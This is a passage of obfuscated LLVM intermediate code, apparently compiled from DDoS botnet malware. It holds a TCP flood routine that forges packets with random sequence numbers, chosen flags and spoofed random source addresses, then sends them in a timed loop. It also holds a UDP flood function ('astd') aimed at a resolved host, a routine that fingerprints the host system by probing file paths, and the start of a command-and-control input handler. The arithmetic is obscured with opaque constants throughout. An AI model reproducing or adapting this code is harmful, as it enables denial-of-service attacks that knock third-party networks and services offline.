  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon.1* %110 to %struct.anon.2*
  %112 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %111, i32 0, i32 0
  store i16 %108, i16* %112, align 4
  %113 = call i32 @rand_cmwc()
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.1* %115 to %struct.anon.2*
  %117 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %116, i32 0, i32 2
  store i32 %113, i32* %117, align 4
  %118 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %119 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %118, i32 0, i32 0
  %120 = bitcast %union.anon.1* %119 to %struct.anon.2*
  %121 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %120, i32 0, i32 3
  store i32 0, i32* %121, align 4
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.1* %123 to %struct.anon.2*
  %125 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = xor i16 %126, -1
  %128 = xor i16 -241, -1
  %129 = xor i16 17724, -1
  %130 = or i16 %127, %128
  %131 = or i16 17724, %129
  %132 = xor i16 %130, -1
  %133 = and i16 %132, %131
  %134 = and i16 %126, -241
  %135 = xor i16 %133, -1
  %136 = xor i16 80, -1
  %137 = xor i16 -28946, -1
  %138 = and i16 %135, -28946
  %139 = and i16 %133, %137
  %140 = and i16 %136, -28946
  %141 = and i16 80, %137
  %142 = or i16 %138, %139
  %143 = or i16 %140, %141
  %144 = xor i16 %142, %143
  %145 = or i16 %135, %136
  %146 = xor i16 %145, -1
  %147 = or i16 -28946, %137
  %148 = and i16 %146, %147
  %149 = or i16 %144, %148
  %150 = or i16 %133, 80
  store i16 %149, i16* %125, align 4
  %151 = load i8*, i8** %12, align 8
  %152 = call i32 @strcmp(i8* %151, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i32 0, i32 0)) #10
  %153 = icmp ne i32 %152, 0
  br i1 %153, label %260, label %154

; <label>:154:                                    ; preds = %78
  %155 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.1* %156 to %struct.anon.2*
  %158 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %157, i32 0, i32 4
  %159 = load i16, i16* %158, align 4
  %160 = xor i16 %159, -1
  %161 = xor i16 -513, -1
  %162 = xor i16 15174, -1
  %163 = or i16 %160, %161
  %164 = or i16 15174, %162
  %165 = xor i16 %163, -1
  %166 = and i16 %165, %164
  %167 = and i16 %159, -513
  %168 = and i16 %166, 512
  %169 = xor i16 %166, 512
  %170 = or i16 %168, %169
  %171 = or i16 %166, 512
  store i16 %170, i16* %158, align 4
  %172 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %173 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.1* %173 to %struct.anon.2*
  %175 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %174, i32 0, i32 4
  %176 = load i16, i16* %175, align 4
  %177 = xor i16 %176, -1
  %178 = xor i16 -1025, -1
  %179 = xor i16 -26905, -1
  %180 = or i16 %177, %178
  %181 = or i16 -26905, %179
  %182 = xor i16 %180, -1
  %183 = and i16 %182, %181
  %184 = and i16 %176, -1025
  %185 = xor i16 %183, -1
  %186 = xor i16 1024, -1
  %187 = xor i16 27899, -1
  %188 = and i16 %185, 27899
  %189 = and i16 %183, %187
  %190 = and i16 %186, 27899
  %191 = and i16 1024, %187
  %192 = or i16 %188, %189
  %193 = or i16 %190, %191
  %194 = xor i16 %192, %193
  %195 = or i16 %185, %186
  %196 = xor i16 %195, -1
  %197 = or i16 27899, %187
  %198 = and i16 %196, %197
  %199 = or i16 %194, %198
  %200 = or i16 %183, 1024
  store i16 %199, i16* %175, align 4
  %201 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.1* %202 to %struct.anon.2*
  %204 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = xor i16 -257, -1
  %207 = xor i16 %205, %206
  %208 = and i16 %207, %205
  %209 = and i16 %205, -257
  %210 = and i16 %208, 256
  %211 = xor i16 %208, 256
  %212 = or i16 %210, %211
  %213 = or i16 %208, 256
  store i16 %212, i16* %204, align 4
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.1* %215 to %struct.anon.2*
  %217 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = xor i16 %218, -1
  %220 = xor i16 -4097, -1
  %221 = xor i16 10365, -1
  %222 = or i16 %219, %220
  %223 = or i16 10365, %221
  %224 = xor i16 %222, -1
  %225 = and i16 %224, %223
  %226 = and i16 %218, -4097
  %227 = and i16 %225, 4096
  %228 = xor i16 %225, 4096
  %229 = or i16 %227, %228
  %230 = or i16 %225, 4096
  store i16 %229, i16* %217, align 4
  %231 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 0
  %233 = bitcast %union.anon.1* %232 to %struct.anon.2*
  %234 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = xor i16 %235, -1
  %237 = xor i16 -2049, -1
  %238 = xor i16 8524, -1
  %239 = or i16 %236, %237
  %240 = or i16 8524, %238
  %241 = xor i16 %239, -1
  %242 = and i16 %241, %240
  %243 = and i16 %235, -2049
  %244 = xor i16 %242, -1
  %245 = xor i16 2048, -1
  %246 = xor i16 4920, -1
  %247 = and i16 %244, 4920
  %248 = and i16 %242, %246
  %249 = and i16 %245, 4920
  %250 = and i16 2048, %246
  %251 = or i16 %247, %248
  %252 = or i16 %249, %250
  %253 = xor i16 %251, %252
  %254 = or i16 %244, %245
  %255 = xor i16 %254, -1
  %256 = or i16 4920, %246
  %257 = and i16 %255, %256
  %258 = or i16 %253, %257
  %259 = or i16 %242, 2048
  store i16 %258, i16* %234, align 4
  br label %384

; <label>:260:                                    ; preds = %78
  %261 = load i8*, i8** %12, align 8
  %262 = call i8* @strtok(i8* %261, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %262, i8** %23, align 8
  br label %263

; <label>:263:                                    ; preds = %381, %260
  %264 = load i8*, i8** %23, align 8
  %265 = icmp ne i8* %264, null
  br i1 %265, label %266, label %383

; <label>:266:                                    ; preds = %263
  %267 = load i8*, i8** %23, align 8
  %268 = call i32 @strcmp(i8* %267, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i32 0, i32 0)) #10
  %269 = icmp ne i32 %268, 0
  br i1 %269, label %284, label %270

; <label>:270:                                    ; preds = %266
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.1* %272 to %struct.anon.2*
  %274 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %273, i32 0, i32 4
  %275 = load i16, i16* %274, align 4
  %276 = xor i16 -513, -1
  %277 = xor i16 %275, %276
  %278 = and i16 %277, %275
  %279 = and i16 %275, -513
  %280 = and i16 %278, 512
  %281 = xor i16 %278, 512
  %282 = or i16 %280, %281
  %283 = or i16 %278, 512
  store i16 %282, i16* %274, align 4
  br label %381

; <label>:284:                                    ; preds = %266
  %285 = load i8*, i8** %23, align 8
  %286 = call i32 @strcmp(i8* %285, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i32 0, i32 0)) #10
  %287 = icmp ne i32 %286, 0
  br i1 %287, label %302, label %288

; <label>:288:                                    ; preds = %284
  %289 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 0
  %291 = bitcast %union.anon.1* %290 to %struct.anon.2*
  %292 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %291, i32 0, i32 4
  %293 = load i16, i16* %292, align 4
  %294 = xor i16 -1025, -1
  %295 = xor i16 %293, %294
  %296 = and i16 %295, %293
  %297 = and i16 %293, -1025
  %298 = and i16 %296, 1024
  %299 = xor i16 %296, 1024
  %300 = or i16 %298, %299
  %301 = or i16 %296, 1024
  store i16 %300, i16* %292, align 4
  br label %380

; <label>:302:                                    ; preds = %284
  %303 = load i8*, i8** %23, align 8
  %304 = call i32 @strcmp(i8* %303, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0)) #10
  %305 = icmp ne i32 %304, 0
  br i1 %305, label %320, label %306

; <label>:306:                                    ; preds = %302
  %307 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon.1* %308 to %struct.anon.2*
  %310 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %309, i32 0, i32 4
  %311 = load i16, i16* %310, align 4
  %312 = xor i16 -257, -1
  %313 = xor i16 %311, %312
  %314 = and i16 %313, %311
  %315 = and i16 %311, -257
  %316 = and i16 %314, 256
  %317 = xor i16 %314, 256
  %318 = or i16 %316, %317
  %319 = or i16 %314, 256
  store i16 %318, i16* %310, align 4
  br label %379

; <label>:320:                                    ; preds = %302
  %321 = load i8*, i8** %23, align 8
  %322 = call i32 @strcmp(i8* %321, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0)) #10
  %323 = icmp ne i32 %322, 0
  br i1 %323, label %354, label %324

; <label>:324:                                    ; preds = %320
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon.1* %326 to %struct.anon.2*
  %328 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %327, i32 0, i32 4
  %329 = load i16, i16* %328, align 4
  %330 = xor i16 %329, -1
  %331 = xor i16 -4097, -1
  %332 = xor i16 5431, -1
  %333 = or i16 %330, %331
  %334 = or i16 5431, %332
  %335 = xor i16 %333, -1
  %336 = and i16 %335, %334
  %337 = and i16 %329, -4097
  %338 = xor i16 %336, -1
  %339 = xor i16 4096, -1
  %340 = xor i16 -261, -1
  %341 = and i16 %338, -261
  %342 = and i16 %336, %340
  %343 = and i16 %339, -261
  %344 = and i16 4096, %340
  %345 = or i16 %341, %342
  %346 = or i16 %343, %344
  %347 = xor i16 %345, %346
  %348 = or i16 %338, %339
  %349 = xor i16 %348, -1
  %350 = or i16 -261, %340
  %351 = and i16 %349, %350
  %352 = or i16 %347, %351
  %353 = or i16 %336, 4096
  store i16 %352, i16* %328, align 4
  br label %378

; <label>:354:                                    ; preds = %320
  %355 = load i8*, i8** %23, align 8
  %356 = call i32 @strcmp(i8* %355, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0)) #10
  %357 = icmp ne i32 %356, 0
  br i1 %357, label %376, label %358

; <label>:358:                                    ; preds = %354
  %359 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %360 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %359, i32 0, i32 0
  %361 = bitcast %union.anon.1* %360 to %struct.anon.2*
  %362 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %361, i32 0, i32 4
  %363 = load i16, i16* %362, align 4
  %364 = xor i16 %363, -1
  %365 = xor i16 -2049, -1
  %366 = xor i16 12225, -1
  %367 = or i16 %364, %365
  %368 = or i16 12225, %366
  %369 = xor i16 %367, -1
  %370 = and i16 %369, %368
  %371 = and i16 %363, -2049
  %372 = and i16 %370, 2048
  %373 = xor i16 %370, 2048
  %374 = or i16 %372, %373
  %375 = or i16 %370, 2048
  store i16 %374, i16* %362, align 4
  br label %377

; <label>:376:                                    ; preds = %354
  br label %377

; <label>:377:                                    ; preds = %376, %358
  br label %378

; <label>:378:                                    ; preds = %377, %324
  br label %379

; <label>:379:                                    ; preds = %378, %306
  br label %380

; <label>:380:                                    ; preds = %379, %288
  br label %381

; <label>:381:                                    ; preds = %380, %270
  %382 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %382, i8** %23, align 8
  br label %263

; <label>:383:                                    ; preds = %263
  br label %384

; <label>:384:                                    ; preds = %383, %154
  %385 = call i32 @rand_cmwc()
  %386 = trunc i32 %385 to i16
  %387 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 0
  %389 = bitcast %union.anon.1* %388 to %struct.anon.2*
  %390 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %389, i32 0, i32 5
  store i16 %386, i16* %390, align 2
  %391 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %392 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %391, i32 0, i32 0
  %393 = bitcast %union.anon.1* %392 to %struct.anon.2*
  %394 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %393, i32 0, i32 6
  store i16 0, i16* %394, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 0
  %397 = bitcast %union.anon.1* %396 to %struct.anon.2*
  %398 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %397, i32 0, i32 7
  store i16 0, i16* %398, align 2
  %399 = load i32, i32* %9, align 4
  %400 = icmp eq i32 %399, 0
  br i1 %400, label %401, label %403

; <label>:401:                                    ; preds = %384
  %402 = call i32 @rand_cmwc()
  br label %408

; <label>:403:                                    ; preds = %384
  %404 = load i32, i32* %9, align 4
  %405 = trunc i32 %404 to i16
  %406 = call zeroext i16 @htons(i16 zeroext %405) #9
  %407 = zext i16 %406 to i32
  br label %408

; <label>:408:                                    ; preds = %403, %401
  %409 = phi i32 [ %402, %401 ], [ %407, %403 ]
  %410 = trunc i32 %409 to i16
  %411 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 0
  %413 = bitcast %union.anon.1* %412 to %struct.anon.2*
  %414 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %413, i32 0, i32 1
  store i16 %410, i16* %414, align 2
  %415 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %416 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %417 = call zeroext i16 @tcpcsum(%struct.iphdr* %415, %struct.tcphdr* %416)
  %418 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon.1* %419 to %struct.anon.2*
  %421 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %420, i32 0, i32 6
  store i16 %417, i16* %421, align 4
  %422 = bitcast i8* %86 to i16*
  %423 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 2
  %425 = load i16, i16* %424, align 2
  %426 = zext i16 %425 to i32
  %427 = call zeroext i16 @csum(i16* %422, i32 %426)
  %428 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 7
  store i16 %427, i16* %429, align 2
  %430 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %431 = load i32, i32* %10, align 4
  %432 = sub i32 0, %431
  %433 = sub i32 %430, %432
  %434 = add nsw i32 %430, %431
  store i32 %433, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %435

; <label>:435:                                    ; preds = %488, %487, %408
  br label %436

; <label>:436:                                    ; preds = %435
  %437 = load i32, i32* %17, align 4
  %438 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %439 = call i64 @sendto(i32 %437, i8* %86, i64 %83, i32 0, %struct.sockaddr* %438, i32 16)
  %440 = load i32, i32* %19, align 4
  %441 = call i32 @getRandomIP(i32 %440)
  %442 = call i32 @htonl(i32 %441) #9
  %443 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 8
  store i32 %442, i32* %444, align 4
  %445 = call i32 @rand_cmwc()
  %446 = trunc i32 %445 to i16
  %447 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 3
  store i16 %446, i16* %448, align 4
  %449 = call i32 @rand_cmwc()
  %450 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %451 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %450, i32 0, i32 0
  %452 = bitcast %union.anon.1* %451 to %struct.anon.2*
  %453 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %452, i32 0, i32 2
  store i32 %449, i32* %453, align 4
  %454 = call i32 @rand_cmwc()
  %455 = trunc i32 %454 to i16
  %456 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 0
  %458 = bitcast %union.anon.1* %457 to %struct.anon.2*
  %459 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %458, i32 0, i32 0
  store i16 %455, i16* %459, align 4
  %460 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %461 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %460, i32 0, i32 0
  %462 = bitcast %union.anon.1* %461 to %struct.anon.2*
  %463 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %462, i32 0, i32 6
  store i16 0, i16* %463, align 4
  %464 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %465 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %466 = call zeroext i16 @tcpcsum(%struct.iphdr* %464, %struct.tcphdr* %465)
  %467 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 0
  %469 = bitcast %union.anon.1* %468 to %struct.anon.2*
  %470 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %469, i32 0, i32 6
  store i16 %466, i16* %470, align 4
  %471 = bitcast i8* %86 to i16*
  %472 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i32 0, i32 2
  %474 = load i16, i16* %473, align 2
  %475 = zext i16 %474 to i32
  %476 = call zeroext i16 @csum(i16* %471, i32 %475)
  %477 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %478 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %477, i32 0, i32 7
  store i16 %476, i16* %478, align 2
  %479 = load i32, i32* %25, align 4
  %480 = load i32, i32* %15, align 4
  %481 = icmp eq i32 %479, %480
  br i1 %481, label %482, label %488

; <label>:482:                                    ; preds = %436
  %483 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %484 = load i32, i32* %24, align 4
  %485 = icmp sgt i32 %483, %484
  br i1 %485, label %486, label %487

; <label>:486:                                    ; preds = %482
  br label %495

; <label>:487:                                    ; preds = %482
  store i32 0, i32* %25, align 4
  br label %435

; <label>:488:                                    ; preds = %436
  %489 = load i32, i32* %25, align 4
  %490 = sub i32 0, %489
  %491 = sub i32 0, 1
  %492 = add i32 %490, %491
  %493 = sub i32 0, %492
  %494 = add i32 %489, 1
  store i32 %493, i32* %25, align 4
  br label %435

; <label>:495:                                    ; preds = %486
  %496 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %496)
  br label %497

; <label>:497:                                    ; preds = %495, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @astd(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca [1 x i8*], align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %15 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %15, i32* %9, align 4
  %16 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %17 = sext i32 %16 to i64
  store i64 %17, i64* %10, align 8
  %18 = load i8*, i8** %5, align 8
  %19 = call %struct.hostent* @gethostbyname(i8* %18)
  store %struct.hostent* %19, %struct.hostent** %12, align 8
  %20 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 16, i32 4, i1 false)
  %21 = load %struct.hostent*, %struct.hostent** %12, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 4
  %23 = load i8**, i8*** %22, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %27 = bitcast %struct.in_addr* %26 to i8*
  %28 = load %struct.hostent*, %struct.hostent** %12, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 3
  %30 = load i32, i32* %29, align 4
  %31 = sext i32 %30 to i64
  call void @bcopy(i8* %25, i8* %27, i64 %31) #6
  %32 = load %struct.hostent*, %struct.hostent** %12, align 8
  %33 = getelementptr inbounds %struct.hostent, %struct.hostent* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %35, i16* %36, align 4
  %37 = load i32, i32* %6, align 4
  %38 = trunc i32 %37 to i16
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 0, i32* %13, align 4
  br label %40

; <label>:40:                                     ; preds = %68, %4
  %41 = bitcast [1 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %41, i8* bitcast ([1 x i8*]* @astd.hexstring to i8*), i64 8, i32 8, i1 false)
  %42 = load i32, i32* %13, align 4
  %43 = icmp uge i32 %42, 50
  br i1 %43, label %44, label %68

; <label>:44:                                     ; preds = %40
  %45 = load i32, i32* %9, align 4
  %46 = getelementptr inbounds [1 x i8*], [1 x i8*]* %14, i32 0, i32 0
  %47 = bitcast i8** %46 to i8*
  %48 = load i32, i32* %8, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @send(i32 %45, i8* %47, i64 %49, i32 0)
  %51 = load i32, i32* %9, align 4
  %52 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = sext i32 %54 to i64
  %56 = load i64, i64* %10, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = add i64 %56, 4428798445928520975
  %60 = add i64 %59, %58
  %61 = sub i64 %60, 4428798445928520975
  %62 = add nsw i64 %56, %58
  %63 = icmp sge i64 %55, %61
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %44
  %65 = load i32, i32* %9, align 4
  %66 = call i32 @close(i32 %65)
  call void @_exit(i32 0) #11
  unreachable

; <label>:67:                                     ; preds = %44
  store i32 0, i32* %13, align 4
  br label %68

; <label>:68:                                     ; preds = %67, %40
  %69 = load i32, i32* %13, align 4
  %70 = add i32 %69, 646258703
  %71 = add i32 %70, 1
  %72 = sub i32 %71, 646258703
  %73 = add i32 %69, 1
  store i32 %72, i32* %13, align 4
  br label %40
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i8* @defarchs() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @defopsys() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @defpkgs() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.14, i32 0, i32 0), i32 0) #6
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:5:                                      ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.16, i32 0, i32 0), i32 0) #6
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %5
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:9:                                      ; preds = %5
  %10 = call i32 @access(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.18, i32 0, i32 0), i32 0) #6
  %11 = icmp ne i32 %10, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.19, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:13:                                     ; preds = %9
  %14 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.20, i32 0, i32 0), i32 0) #6
  %15 = icmp ne i32 %14, -1
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %13
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:17:                                     ; preds = %13
  %18 = call i32 @access(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i32 0) #6
  %19 = icmp ne i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %17
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:21:                                     ; preds = %17
  %22 = call i32 @access(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i32 0) #6
  %23 = icmp ne i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %21
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:25:                                     ; preds = %21
  %26 = call i32 @access(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i32 0) #6
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.27, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:29:                                     ; preds = %25
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.28, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:30:                                     ; preds = %29, %28, %24, %20, %16, %12, %8, %4
  %31 = load i8*, i8** %1, align 8
  ret i8* %31
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @cncinput(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i64, align 8
